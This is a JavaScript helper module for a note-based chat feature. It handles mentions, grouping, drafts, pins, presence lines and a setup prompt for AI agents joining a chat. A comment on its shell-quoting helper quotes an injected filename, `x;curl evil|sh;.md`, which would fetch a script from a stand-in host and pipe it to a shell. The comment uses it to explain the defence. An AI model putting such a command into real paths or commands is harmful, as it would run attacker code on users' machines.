// File-based chat — pure helpers, no React, no window. ChatView.jsx is a thin
// renderer over these.
//
// The chat itself is a note (backend/handlers/chat_markdown.go owns the
// format); this module only decides how the web UI names, colours, groups and
// polls it.

// isChatDoc mirrors the backend's IsChatNote: leading frontmatter with
// `mdnest-chat: true`. Same frontmatter grammar as isMarpDoc (marp.js).
export function isChatDoc(content) {
  if (typeof content !== 'string') return false;
  const m = content.match(/^\uFEFF?---\r?\n([\s\S]*?)\r?\n---[ \t]*(\r?\n|$)/);
  if (!m) return false;
  return /^mdnest-chat[ \t]*:[ \t]*["']?true["']?[ \t]*$/im.test(m[1]);
}

// Poll cadence. The chat view does not depend on the live-collab websocket
// (off by default, multi mode only), so polling is the one mechanism that
// works on every install. Reads are cheap: `after=N` returns only new posts.
export const CHAT_POLL_MS = 3000;
export const CHAT_LIST_POLL_MS = 15000;

// Consecutive messages from one author inside this window share a header,
// like every chat app — a run of short agent updates reads as one turn.
export const GROUP_WINDOW_MS = 5 * 60 * 1000;

// Default folder a new chat lands in, inside the chosen namespace.
export const DEFAULT_CHAT_FOLDER = 'Chats';

// slugify turns a channel name into a filename. Deliberately conservative
// (lowercase ascii, digits, dashes): the path is what agents get handed, so
// it should survive a shell and a URL without quoting.
export function slugify(title) {
  const s = String(title || '')
    .normalize('NFKD')
    .replace(/[̀-ͯ]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 60)
    .replace(/-+$/g, '');
  return s || 'chat';
}

// chatPathFor builds the note path for a new chat: <folder>/<slug>.md.
export function chatPathFor(title, folder = DEFAULT_CHAT_FOLDER) {
  const dir = String(folder || '').replace(/^\/+|\/+$/g, '');
  const file = `${slugify(title)}.md`;
  return dir ? `${dir}/${file}` : file;
}

// Author colours are theme tokens, never literals (theme-tokens.test.js), so
// a name keeps a readable colour in both light and dark mode.
export const AUTHOR_COLORS = ['--accent', '--success', '--orange', '--pink', '--purple', '--info', '--lavender', '--warning'];

// colorForAuthor is stable per name: the same agent is the same colour in
// every chat and after every reload.
export function colorForAuthor(name) {
  let h = 0;
  for (const ch of String(name || '')) h = (h * 31 + ch.codePointAt(0)) >>> 0;
  return AUTHOR_COLORS[h % AUTHOR_COLORS.length];
}

// isOwnMessage: was this posted by me, under the name I am posting as now?
// `account` is my login (multi mode; null in single mode) and `postingAs` the
// label on my posts. The server writes a label that differs from the account
// as "label (via account)", so an agent running on my token as `claude-a` is
// NOT me — it renders on the other side, as its own voice.
export function isOwnMessage(msg, account, postingAs) {
  if (!msg || !postingAs) return false;
  const expectedVia = account && postingAs !== account ? account : '';
  return msg.author === postingAs && (msg.via || '') === expectedVia;
}

// groupMessages marks which messages start a new visual group.
export function groupMessages(messages) {
  let prev = null;
  return (messages || []).map((m) => {
    const t = Date.parse(m.time);
    const startsGroup = !prev
      || prev.author !== m.author
      || prev.via !== m.via
      || !(t - Date.parse(prev.time) <= GROUP_WINDOW_MS);
    prev = m;
    return { ...m, startsGroup };
  });
}

// mergeMessages appends a polled batch without duplicating anything already
// shown (a poll and a just-sent post can both deliver the same #N).
export function mergeMessages(current, incoming) {
  const seen = new Set((current || []).map((m) => m.n));
  const add = (incoming || []).filter((m) => !seen.has(m.n));
  if (add.length === 0) return current || [];
  return [...(current || []), ...add].sort((a, b) => a.n - b.n);
}

// plainPreview flattens a message for the one-line list preview: the list
// shows text, not rendered markdown, so the emphasis/code markers would
// otherwise appear literally ("**Shipping**").
export function plainPreview(text) {
  return String(text || '')
    .replace(/```[\s\S]*?(```|$)/g, ' [code] ')
    .replace(/!\[[^\]]*\]\([^)]*\)/g, '[image]')
    .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/[*_`~#>]+/g, '')
    .replace(/\s+/g, ' ')
    .trim();
}

// formatChatTime: time only for today, date + time otherwise.
export function formatChatTime(iso, now = new Date()) {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return '';
  const time = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  if (d.toDateString() === now.toDateString()) return time;
  return `${d.toLocaleDateString([], { day: 'numeric', month: 'short' })} ${time}`;
}

// shellQuote single-quotes a word unless it is made only of characters no
// shell gives meaning to. A chat path is chosen by whoever created the note,
// which in a shared workspace is not the person pasting the snippet, so a
// name like `x;curl evil|sh;.md` must reach the shell as one inert word.
export function shellQuote(word) {
  const w = String(word);
  if (/^[A-Za-z0-9@%+=:,./_-]+$/.test(w)) return w;
  return `'${w.replace(/'/g, `'\\''`)}'`;
}

// --- chat images -----------------------------------------------------------
// A message names an image with ![nod](gif:nod). The list the server returns
// (/api/chat/gifs) already applies the precedence: the workspace's own
// ChatGifs/nod.* first, otherwise the built-in that ships with mdnest. A
// namespace-relative path (![x](ChatGifs/x.svg)) also still works.
export const CHAT_GIF_DIR = 'ChatGifs';

// expandGifRefs rewrites ](gif:NAME) to ](URL) before the markdown is
// rendered (DOMPurify would drop an unknown "gif:" scheme), using urlFor to
// turn a listed image into a URL. An unknown name becomes plain text, so a
// typo reads as a typo rather than a broken image.
export function expandGifRefs(text, gifs, urlFor) {
  return String(text || '').replace(/!\[([^\]]*)\]\(gif:([\w.-]+)\)/g, (all, alt, name) => {
    const g = (gifs || []).find((x) => x.name.toLowerCase() === name.toLowerCase());
    return g ? `![${alt}](${urlFor(g)})` : `\`:${name}:\``;
  });
}

// avatarFor finds the poster's avatar-NAME.* in the library (case-insensitive).
export function avatarFor(gifs, author) {
  const want = String(author || '').toLowerCase();
  if (!want) return null;
  return (gifs || []).find((g) => (g.avatar || '').toLowerCase() === want) || null;
}

// reactions: the library minus avatars, for the picker.
export function reactions(gifs) {
  return (gifs || []).filter((g) => !g.avatar && g.kind !== 'avatar-choice');
}

// initialOf: the letter shown in a poster's fallback thumbnail.
export function initialOf(name) {
  const m = String(name || '').match(/[A-Za-z0-9]/);
  return m ? m[0].toUpperCase() : '?';
}

export function gifMarkdown(g) {
  return `![${g.name}](gif:${g.name})`;
}

// --- @mentions ---------------------------------------------------------
// Same grammar as the backend's ChatMentions (chat_markdown.go): an @ at the
// start or after a non-word character (so an email is not a mention), then a
// name. @all / @everyone address everyone.
const MENTION_RE = /(^|[^\w@])@([A-Za-z0-9_][\w.-]*)/g;
const BROADCAST = new Set(['all', 'everyone']);

function cleanName(raw) {
  return raw.replace(/[.-]+$/, '');
}

// mentionsName: does this text address name (directly, or via @all)?
export function mentionsName(text, name) {
  const want = String(name || '').trim().toLowerCase();
  if (!want) return false;
  for (const m of String(text || '').matchAll(MENTION_RE)) {
    const got = cleanName(m[2]).toLowerCase();
    if (got === want || BROADCAST.has(got)) return true;
  }
  return false;
}

// highlightMentions wraps @name in a span before the markdown is rendered.
// Code is left alone: inside a fence or `inline code` an @ is literal text.
// The span survives sanitizeHtml (class and data-* are kept by design).
export function highlightMentions(text) {
  const parts = String(text || '').split(/(```[\s\S]*?(?:```|$)|`[^`\n]*`)/g);
  return parts.map((part, i) => {
    if (i % 2 === 1) return part; // a code span or fence
    return part.replace(MENTION_RE, (all, pre, raw) => {
      const name = cleanName(raw);
      const tail = raw.slice(name.length);
      return `${pre}<span class="chat-mention" data-mention="${name.toLowerCase()}">@${name}</span>${tail}`;
    });
  }).join('');
}

// participants: everyone who has posted, most recent first, for @-completion.
export function participants(messages) {
  const seen = new Map();
  for (const m of messages || []) seen.set(m.author, m.n);
  return [...seen.entries()].sort((a, b) => b[1] - a[1]).map(([name]) => name);
}

// mentionQuery: if the caret sits right after "@abc", return "abc" (the
// word being typed), else null.
export function mentionQuery(text, caret) {
  const before = String(text || '').slice(0, caret);
  const m = before.match(/(?:^|[^\w@])@([\w.-]*)$/);
  return m ? m[1] : null;
}

// completeMention replaces the "@abc" before the caret with "@name ".
export function completeMention(text, caret, name) {
  const before = text.slice(0, caret);
  const after = text.slice(caret);
  const start = before.lastIndexOf('@');
  const head = before.slice(0, start) + '@' + name + ' ';
  return { text: head + after, caret: head.length };
}

// The prompt shown in a chat's "Connect an agent" panel, to paste into an
// agent as-is. Two lessons are built in:
//   - one name, used on EVERY command. A literal `--as my-agent` in the old
//     snippet is what agents posted as, whatever they were told they were
//     called, and mentions only reach the name an agent actually uses;
//   - an explicit loop. Some agents (Codex) end their turn once the listed
//     commands are done, so "wait, reply, wait again, never stop" has to be
//     spelled out, with short timeouts for tools that kill long commands.
// It must stay pasteable (pasteable-commands.test.js): no <angle-bracket>
// stand-ins, and the target is shell-quoted whenever it needs to be.
// intent is what the person wants this agent to do here, typed in the panel.
// Like the name, it becomes part of the prompt; it is prose for the agent and
// never reaches a shell command, so it needs no quoting. Copying the prompt
// also saves it as the agent's role in the chat (chat_traits.go), which the
// server repeats to the agent every time wait hands it new messages: agents
// forget the job they were given once their context is summarised.
export function agentInstructions(alias, ns, path, name = 'AGENT_NAME', intent = '') {
  const target = shellQuote(`${alias ? `@${alias}/` : ''}${ns}/${path}`);
  const nsTarget = shellQuote(`${alias ? `@${alias}/` : ''}${ns}`);
  const as = shellQuote(name);
  const job = String(intent || '').trim();
  return [
    `You are ${name} in an mdnest chat. Use --as ${as} on every command, and only that name.`,
    '',
    ...(job ? ['Your job in this chat:', ...job.split(/\r?\n/).map((l) => `  ${l}`),
      'This is saved with the chat as your role, and wait repeats it after new messages.',
      'Keep to it, even after a long conversation, unless a human gives you a new one.', ''] : []),
    'Join',
    `1. Read the chat once: mdnest chat read ${target} --as ${as}`,
    '   This also saves your place. From then on, wait gives you only what is new,',
    '   so never read the whole chat again.',
    `2. Pick a thumbnail nobody here uses: mdnest chat avatar ${nsTarget} --as ${as} --pick auto`,
    '3. Introduce yourself in one short message: who you are, what you will do, and',
    '   answers to anything already waiting for you.',
    `   mdnest chat post ${target} "..." --as ${as}`,
    '',
    'Loop (never end your turn while in the chat: once it ends, nobody hears the chat until someone types to you)',
    `   mdnest chat wait ${target} --as ${as} --timeout 120`,
    '   exit 0: new messages are printed. Reply if it is for you, then wait again.',
    '   exit 2: nothing new yet. Run the same wait again.',
    '   exit 3: the chat was deleted, or you lost access. Stop: you are out of the chat.',
    `   Truly lost track? mdnest chat read ${target} shows it all (no --as, so your place stays).`,
    '   Must you answer outside the chat, e.g. in your terminal? Start the wait in the background',
    '   first (run_in_background), so its output wakes you, then reply there.',
    `   Leave only when your lead or a human says you are done: post a one-line goodbye, then`,
    `   mdnest chat leave ${target} --as ${as}`,
    '',
    'How to behave',
    '- You show as waiting while you wait. Before a task of more than a minute, say what you do:',
    `  mdnest chat post ${target} "/status what you are doing" --as ${as} (not a chat message; repeat every 2 min).`,
    '  Your next post, or going back to wait, clears it. Never leave a status up while only waiting.',
    `- New role from a human, or none saved yet? Save it: mdnest chat post ${target} "/role what you do here" --as ${as}`,
    '- Need a human to answer or decide, even the one who started you? Ask @their-name here, add',
    '  ![waiting](gif:question), and keep waiting. Never stop to ask in your terminal instead.',
    '- A permission or safety check blocked one of your commands? Never route it through the chat:',
    '  do not post it for someone to run or approve. Start the wait in the background (so the human',
    '  can answer you in your terminal) and keep waiting. A block never ends your time in the chat.',
    `- Other agents may be here. Answer only what is addressed to you (@${name}, @all) or is your part.`,
    '  Do not repeat what someone already said: agree with ![nod](gif:nod) instead. Keep replies',
    '  short and to the point. In a busy chat, add --mentions to wait.',
    `- Emoji are fine. Images react too, e.g. ![done](gif:done). List them: mdnest chat gifs ${nsTarget}`,
    '- Report how full your context window is when you join, then about every 10 messages:',
    `  mdnest chat post ${target} "/context 42%" --as ${as} (or 87k/200k). It shows by your name, not in the chat.`,
  ].join('\n');
}

// An agent's last /context report (chat_context.go) as the short chip shown
// by its name: "44%", or "87k" when it gave only a token count. CONTEXT_HIGH
// is where the chip turns to a warning: past it an agent is close to full and
// a person may want to start it fresh.
export const CONTEXT_HIGH = 80;
const tokens = (n) => (n >= 1e6 ? `${+(n / 1e6).toFixed(1)}M` : n >= 1e3 ? `${Math.round(n / 1e3)}k` : String(n));
export function contextLabel(c) {
  if (!c) return '';
  if (c.pct >= 0) return `${c.pct}%`;
  return c.used ? tokens(c.used) : '';
}
export function contextTitle(c, now = Date.now()) {
  if (!c) return '';
  const amount = c.used && c.total ? `${tokens(c.used)} of ${tokens(c.total)} tokens` : c.used ? `${tokens(c.used)} tokens` : `${c.pct}%`;
  const mins = Math.max(0, Math.floor((now - Date.parse(c.at)) / 60000));
  return `Context used: ${amount}, reported ${mins < 1 ? 'just now' : `${mins} min ago`}`;
}

// workingLine turns the chat's presence into the one quiet line under the
// conversation. The server infers most of it from the polls agents already
// make (chat_status.go), so it needs no CLI update:
//   working    codxu is working: reviewing the PR · 3 min   (a /status)
//   thinking   codxu is thinking                            (got new messages)
//   waiting    lead-qa and qa-1 are waiting                 (kind "listening")
// Busy posters come first; waiting ones are named together at the end. Only
// an entry with status text reads as working: anything else, including a
// kind this page does not know yet, reads as waiting, so an older page and a
// newer server never show "is working: undefined". Your own presence (the
// same author/via rule as isOwnMessage) is left out. A name with a /context
// report carries it: "codxu (44%) is waiting". `title` lists everyone
// for the tooltip. Returns null when nobody else is here.
export function workingLine(working, account, postingAs, now = Date.now()) {
  const others = (working || []).filter((w) => !isOwnMessage(w, account, postingAs));
  if (others.length === 0) return null;
  const mins = (w) => Math.floor((now - Date.parse(w.since)) / 60000);
  const after = (w) => (mins(w) >= 1 ? ` · ${mins(w)} min` : '');
  const busy = [];
  const waiting = [];
  const who = (w) => (contextLabel(w.context) ? `${w.author} (${contextLabel(w.context)})` : w.author);
  for (const w of others) {
    if (w.kind === 'thinking') busy.push(`${who(w)} is thinking${after(w)}`);
    else if (w.kind !== 'listening' && w.text) busy.push(`${who(w)} is working: ${w.text}${after(w)}`);
    else waiting.push(who(w));
  }
  const names = (list) => (list.length <= 2 ? list.join(' and ') : `${list.slice(0, -1).join(', ')} and ${list[list.length - 1]}`);
  const parts = [...busy];
  if (waiting.length) parts.push(`${names(waiting)} ${waiting.length === 1 ? 'is' : 'are'} waiting`);
  return {
    text: parts.join('  ·  '),
    title: [...busy, ...waiting.map((n) => `${n} is waiting`)].join('\n'),
    count: others.length,
    busy: busy.length > 0,
  };
}

// Pinned chats, saved as the chat_pins preference: a JSON array of "ns/path"
// strings, newest pin first. Pins from other workspaces stay in the list, so
// switching workspace does not lose them.
export const MAX_CHAT_PINS_LENGTH = 4096; // store.MaxChatPinsValue
export const pinKey = (ns, path) => `${ns}/${path}`;
export function parsePins(raw) {
  try {
    const v = JSON.parse(raw || '[]');
    return Array.isArray(v) ? v.filter((x) => typeof x === 'string' && x) : [];
  } catch {
    return [];
  }
}
export function togglePin(pins, key) {
  return pins.includes(key) ? pins.filter((k) => k !== key) : [key, ...pins];
}
// The chats a tab shows. "pinned" keeps the pin order; "all" keeps the
// list's own order (latest activity first).
export function chatsForTab(chats, pins, tab) {
  if (tab !== 'pinned') return chats;
  const byKey = new Map(chats.map((c) => [pinKey(c.ns, c.path), c]));
  return pins.map((k) => byKey.get(k)).filter(Boolean);
}

// roleFor finds an agent's saved role, matching names the way mentions do.
export function roleFor(agents, name) {
  const want = String(name || '').toLowerCase();
  for (const [k, v] of Object.entries(agents || {})) if (k.toLowerCase() === want) return v;
  return '';
}

// What deleting a chat does, in the words of the warning shown before it
// (the chats view's popup, and the file tree's confirm for a chat note). Only
// the owner or an admin gets this far: the server refuses everyone else.
export function chatDeleteConsequences(count) {
  const n = Number(count) || 0;
  return [
    n === 1 ? 'Its 1 message is deleted, for everyone in the chat.'
      : n ? `All ${n} messages are deleted, for everyone in the chat.` : 'The chat is deleted, for everyone in it.',
    'Anyone with it open sees that it was deleted, and agents waiting in it are told it is gone and stop.',
    'This cannot be undone here. A git backup of the workspace, if it has one, keeps the old copy.',
  ];
}

export function chatDeleteWarning(title, count) {
  return [`Delete the chat "${title}" for everyone?`, '', ...chatDeleteConsequences(count).map((l) => `- ${l}`)].join('\n');
}

// Unsent drafts, one per chat. Switching to another chat unmounts the open
// one, which used to throw away whatever was typed in it. Kept in
// localStorage so a draft also survives a reload, with an in-memory copy for
// browsers where storage throws (private windows, blocked site data).
const memDrafts = new Map();

export function draftKey(ns, path) {
  return `mdnest_chat_draft:${ns}/${path}`;
}

export function loadDraft(ns, path) {
  const k = draftKey(ns, path);
  try {
    const v = localStorage.getItem(k);
    if (v !== null) return v;
  } catch { /* storage unavailable: use the in-memory copy */ }
  return memDrafts.get(k) || '';
}

export function saveDraft(ns, path, text) {
  const k = draftKey(ns, path);
  if (text) memDrafts.set(k, text); else memDrafts.delete(k);
  try {
    if (text) localStorage.setItem(k, text); else localStorage.removeItem(k);
  } catch { /* storage unavailable: the in-memory copy still holds it */ }
}
